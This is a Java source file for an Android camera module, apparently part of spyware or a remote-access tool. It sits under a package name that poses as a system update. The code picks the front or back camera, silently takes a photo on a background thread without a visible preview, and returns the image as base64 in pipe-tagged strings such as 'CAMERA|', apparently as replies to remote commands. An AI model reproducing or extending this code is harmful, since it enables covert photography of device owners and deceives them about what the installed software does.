package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private static final int CAMERA_TIMEOUT_MS = 10000; // 10 seconds
    
    private Context context;
    private int backCameraId = -1;
    private int frontCameraId = -1;
    private int currentCameraId = -1;
    private boolean isFrontCamera = false;
    private Handler mainHandler;
    
    public interface CameraCallback {
        void onPhotoTaken(String base64Image);
        void onError(String error);
    }
    
    public CameraModule(Context context) {
        this.context = context;
        this.mainHandler = new Handler(Looper.getMainLooper());
        initCameras();
    }
    
    private void initCameras() {
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    backCameraId = i;
                    Log.d(TAG, "Found back camera: " + i);
                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    frontCameraId = i;
                    Log.d(TAG, "Found front camera: " + i);
                }
            }
            
            // Set default to back camera
            if (backCameraId != -1) {
                currentCameraId = backCameraId;
                isFrontCamera = false;
            } else if (frontCameraId != -1) {
                currentCameraId = frontCameraId;
                isFrontCamera = true;
            }
            
            Log.d(TAG, "Cameras initialized - Back: " + backCameraId + ", Front: " + frontCameraId);
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing cameras", e);
        }
    }
    
    public String switchCamera() {
        try {
            if (frontCameraId != -1 && backCameraId != -1) {
                if (currentCameraId == backCameraId) {
                    currentCameraId = frontCameraId;
                    isFrontCamera = true;
                    return "CAMERA_SWITCH|Front camera activated";
                } else {
                    currentCameraId = backCameraId;
                    isFrontCamera = false;
                    return "CAMERA_SWITCH|Back camera activated";
                }
            } else if (frontCameraId == -1 && backCameraId != -1) {
                return "CAMERA_SWITCH|Only back camera available";
            } else if (backCameraId == -1 && frontCameraId != -1) {
                return "CAMERA_SWITCH|Only front camera available";
            }
            return "CAMERA_SWITCH|No camera available";
        } catch (Exception e) {
            Log.e(TAG, "Error switching camera", e);
            return "CAMERA_SWITCH|Error: " + e.getMessage();
        }
    }
    
    public String getCurrentCameraInfo() {
        try {
            if (currentCameraId != -1) {
                return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
            }
            return "CAMERA_INFO|No camera selected";
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera info", e);
            return "CAMERA_INFO|Error: " + e.getMessage();
        }
    }
    
    public void takePhoto(final CameraCallback callback) {
        if (!checkPermission()) {
            callback.onError("ERROR: No camera permission");
            return;
        }
        
        if (currentCameraId == -1) {
            callback.onError("ERROR: No camera available");
            return;
        }
        
        Log.d(TAG, "Taking photo with camera: " + (isFrontCamera ? "FRONT" : "BACK") + " (ID: " + currentCameraId + ")");
        
        // Run camera operations in a background thread
        new Thread(() -> {
            Camera camera = null;
            try {
                // Open the camera
                camera = Camera.open(currentCameraId);
                Camera.Parameters parameters = camera.getParameters();
                
                // Set photo quality
                parameters.setJpegQuality(95);
                
                // Set the best picture size
                Camera.Size pictureSize = getBestPictureSize(parameters);
                if (pictureSize != null) {
                    parameters.setPictureSize(pictureSize.width, pictureSize.height);
                }
                
                // Set focus mode if supported
                if (parameters.getSupportedFocusModes() != null && 
                    parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                    parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                }
                
                camera.setParameters(parameters);
                
                // Start preview (required for auto focus)
                camera.startPreview();
                
                // Small delay for camera to adjust
                Thread.sleep(500);
                
                // Take picture
                final Semaphore captureSemaphore = new Semaphore(0);
                final AtomicReference<byte[]> imageData = new AtomicReference<>();
                final AtomicReference<String> errorMsg = new AtomicReference<>();
                
                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera cam) {
                        Log.d(TAG, "Photo captured, size: " + data.length + " bytes");
                        imageData.set(data);
                        captureSemaphore.release();
                    }
                });
                
                // Wait for capture with timeout
                if (!captureSemaphore.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                    errorMsg.set("Camera capture timed out");
                }
                
                // Stop preview and release camera
                camera.stopPreview();
                camera.release();
                camera = null;
                
                // Check for errors
                if (errorMsg.get() != null) {
                    final String error = errorMsg.get();
                    mainHandler.post(() -> callback.onError("ERROR: " + error));
                    return;
                }
                
                byte[] data = imageData.get();
                if (data == null || data.length == 0) {
                    mainHandler.post(() -> callback.onError("ERROR: No image data received"));
                    return;
                }
                
                // Convert to base64
                String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
                
                // Return result on main thread
                mainHandler.post(() -> callback.onPhotoTaken("CAMERA|data:image/jpeg;base64," + base64Image));
                
            } catch (Exception e) {
                Log.e(TAG, "Camera capture failed", e);
                final String errorMsg = e.getMessage();
                mainHandler.post(() -> callback.onError("ERROR: " + (errorMsg != null ? errorMsg : "Unknown error")));
            } finally {
                if (camera != null) {
                    try {
                        camera.release();
                    } catch (Exception e) {
                        Log.e(TAG, "Error releasing camera", e);
                    }
                }
            }
        }).start();
    }
    
    private Camera.Size getBestPictureSize(Camera.Parameters parameters) {
        if (parameters.getSupportedPictureSizes() == null) return null;
        
        Camera.Size bestSize = null;
        int targetWidth = 1920; // Target 1080p
        
        for (Camera.Size size : parameters.getSupportedPictureSizes()) {
            if (bestSize == null) {
                bestSize = size;
            } else if (Math.abs(size.width - targetWidth) < Math.abs(bestSize.width - targetWidth)) {
                bestSize = size;
            }
        }
        return bestSize;
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    public void cleanup() {
        // Nothing to clean up
    }
}
